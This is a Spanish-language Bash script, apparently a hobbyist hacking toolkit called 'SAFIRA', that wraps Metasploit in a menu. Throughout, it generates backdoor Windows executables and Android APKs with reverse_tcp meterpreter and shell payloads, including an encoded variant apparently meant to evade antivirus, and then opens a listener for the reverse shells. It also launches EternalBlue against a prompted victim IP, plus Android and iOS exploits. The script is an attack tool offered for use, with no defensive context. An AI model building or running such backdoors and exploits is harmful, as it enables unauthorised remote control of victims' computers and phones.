#!/bin/bash
#programador cripton666
echo    "
                                      \\\\\\\\\\ SAFIRA //////"
        
   



opciones="windows/meterpreter/reverse_tcp android/meterpreter/reverse_tcp windows/shell/reverse_tcp exploit/android/local/binder_uaf windows/meterpreter/reverse_tcp(shikata_ga_nai) exploit/apple_ios/browser/safari_libtiff exploit/windows/smb/ms17_010_eternalblue"

select opcion in $opciones 
do
        if [ $opcion = "windows/meterpreter/reverse_tcp" ]; then
                echo "Para crear el Backdoor necesito algunos datos"
                read -p "PUERTO :" o 
                read -p "IP o HOST:" a 
                read -p "Nombre de la Aplicacion :" q
                echo "Creando Backdoor"
                msfvenom -p windows/meterpreter/reverse_tcp lhost=$a lport=$o -f exe -o $q.exe 
                echo "Creado con exito"
                echo
                echo "Conectando a base de datos Postgresql"
                sudo service postgresql start
                echo "Conectado con Exito" 
                echo "Abriendo Metasploit"
                msfconsole -x "use multi/handler;\
                set PAYLOAD windows/meterpreter/reverse_tcp;\
                set lhost $a;\
                set lport $o;\
                exploit"
                exit
        elif [ $opcion = "android/meterpreter/reverse_tcp" ]; then
                echo "Para crear el backdoor necesito algunos datos"
                read -p "Puerto :" b 
                read -p "IP o HOST:" c 
                read -p "Nombre del Backdoor :" q
                echo "Creando Backdoor"
                        msfvenom -p android/meterpreter/reverse_tcp LHOST=$c LPORT=$b R > $q.apk
                echo "Creado con exito"
                echo "Conectando servicio postgresql"
                sudo service postgresql start 
                sudo "Conectado con Exito"
                echo "Abriendo Metasploit"
                msfconsole -x "use multi/handler;\
                set PAYLOAD android/meterpreter/reverse_tcp;\
                set lhost $c;\
                set lport $b;\
                exploit"
                exit
        elif [ $opcion = "windows/shell/reverse_tcp" ]; then
                echo "Para crear el Backdoor necesito algunos datos"
                read -p "PUERTO :" o 
                read -p "IP o HOST:" a 
                read -p "Nombre de el Backdoor :" q
                echo "Creando Aplicacion"
                msfvenom -p windows/shell/reverse_tcp lhost=$a lport=$o -f exe -o $q.exe 
                echo "Creado con exito"
                echo "Conectando a servicio postgresql" 
                sudo service postgresql start
                echo "Conectado con Exito" 
                echo "Abriendo Metasploit"
                msfconsole -q -x "use multi/handler;\
                set PAYLOAD windows/shell/reverse_tcp;\
                set lhost $a;\
                set lport $o;\
                exploit"
                exit
        elif [ $opcion = "exploit/android/local/binder_uaf" ]; then
                echo "alerta es un exploit no un Backdoor"
                read -p "numero de la SESSION :" o 
                read -p "IP o Host :" a 
                echo "Abriendo servicio postgresql"
                sudo service postgresql start
                echo "Conectado con exito"
                echo "Ejecutando Metasploit"
                msfconsole -x "use exploit/android/local/binder_uaf;\
                set SESSION $o;\
                set LHOST $a:\
                exploit"      
                exit
        elif [ $opcion = "windows/meterpreter/reverse_tcp(shikata_ga_nai)" ]; then
                echo "Para crear el Backdoor necesito algunos datos"
                read -p "PUERTO :" o 
                read -p "IP o HOST:" a 
                read -p "Nombre de la Aplicacion :" q
                echo "Creando Aplicacion"
                msfvenom -p windows/meterpreter/reverse_tcp lhost=$a lport=$o -e x86/shikata_ga_nai -i 20 -f exe > $q.exe 
                echo "Creado con exito"
                echo "Conectando a servicio postgresql" 
                sudo service postgresql start
                echo "Conectado con Exito" 
                echo "Abriendo Metasploit"
                msfconsole -x "use multi/handler;\
                set PAYLOAD windows/meterpreter/reverse_tcp;\
                set lhost $a;\
                set lport $o;\
                exploit"
                exit
        elif [ $opcion = "exploit/apple_ios/browser/safari_libtiff" ]; then
                echo "alerta es un exploit no un Backdoor"
                read -p "IP o HOST :" a 
                echo "Abriendo servicio postgresql"
                sudo service postgresql start
                echo "Conectado con exito"
                echo "Ejecutando Metasploit"
                msfconsole -x "use exploit/apple_ios/browser/safari_libtiff;\
                set URIPATH;\
                set VRHOST $a;\
                set VRSPORT 8080;\
                run"      
                exit
        elif [ $opcion = "exploit/windows/smb/ms17_010_eternalblue" ]; then
                echo "Para Ejecutar necesito un minimo de datos"
                read -p "IP VICTIMA RHOSTS :" o 
                echo "Conectando con Exploit"
                echo "Conectando a servicio postgresql" 
                sudo service postgresql start
                echo "Conectado con Exito" 
                echo "Abriendo Metasploit"
                msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;\
                set RHOSTS $o;\
                set RPORT 445;\
                set VERIFY_ARCH;\
                set VERIFY_TARGET;\
                exploit"
                exit
        else
                "opcion no permitida"
        fi
done





